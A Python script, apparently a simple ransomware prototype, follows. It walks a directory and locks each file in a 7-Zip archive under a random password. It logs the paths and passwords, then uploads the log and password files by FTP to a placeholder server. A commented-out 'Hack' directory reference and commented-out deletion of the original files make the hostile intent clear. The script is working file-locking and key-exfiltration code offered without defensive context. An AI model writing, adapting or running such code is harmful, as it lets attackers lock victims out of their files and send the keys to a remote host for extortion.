import os
import zipfile
import subprocess
import uuid
import ftplib


def get_filepaths(directory):
    """
    This function will generate the file names in a directory
    tree by walking the tree either top-down or bottom-up. For each
    directory in the tree rooted at directory top (including top itself),
    it yields a 3-tuple (dirpath, dirnames, filenames).
    """
    file_paths = []  # List which will store all of the full filepaths.

    # Walk the tree.
    for root, directories, files in os.walk(directory):
        for filename in files:
            # Join the two strings in order to form the full filepath.
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)  # Add it to the list.

    return file_paths  # Self-explanatory.


# Run the above function and store its results in a variable.
full_file_paths = get_filepaths("C:\\Temp\\Test")

txtfilePath = "C:\\Temp\\LogPython.txt"
txtPwdPath = "C:\\Temp\\LogPwdPython.txt"
if os.path.isfile(txtfilePath):
    os.remove(txtfilePath)              #Delete file

txtfile = open(txtfilePath, "w")

for file in enumerate(full_file_paths):
    txtfile.write(file[1])
    txtfile.write("\n")
    print (file)
    txtfile.write(str(os.path.getmtime(file[1])))
    txtfile.write("\n")
    print (os.path.getmtime(file[1]))
    password = uuid.uuid4().hex
    txtfile.write(password)
    txtfile.write("\n")
    subprocess.call(
        ['C:\\Program Files\\7-Zip\\7z.exe', 'a', file[1] + '.zip', '-mx9', "-p" + password] + [file[1]])
    #os.remove(file[1])   #Delete file

txtfile.close()

password = uuid.uuid4().hex

zf = zipfile.ZipFile('C:\\Temp\\LogPython.zip', mode='w')
try:
    zf.write('C:\\Temp\\LogPython.txt')
finally:
    zf.close()

subprocess.call(
    ['C:\\Program Files\\7-Zip\\7z.exe', 'a', 'C:\\Temp\\LogPythonPwd' + '.zip', '-mx9', "-p" + password] + [
        "C:\\Temp\\Test"])

txtPassword = open(txtPwdPath, "w")
txtPassword.write(password)
txtPassword.close()

session = ftplib.FTP('YOURFTP', 'YOURLOGIN', 'YOURPASS')
#session.cwd('//Hack//')  # move to correct directory
f = open(txtfilePath, 'r')
session.storbinary('STOR ' + 'LogPython', f)
f.close()
f = open(txtPwdPath, 'r')
session.storbinary('STOR ' + 'LogPwdPython', f)
f.close()
session.quit()

#Voir les fichiers dans fileZila info au dessus + port 21.

print ("End")
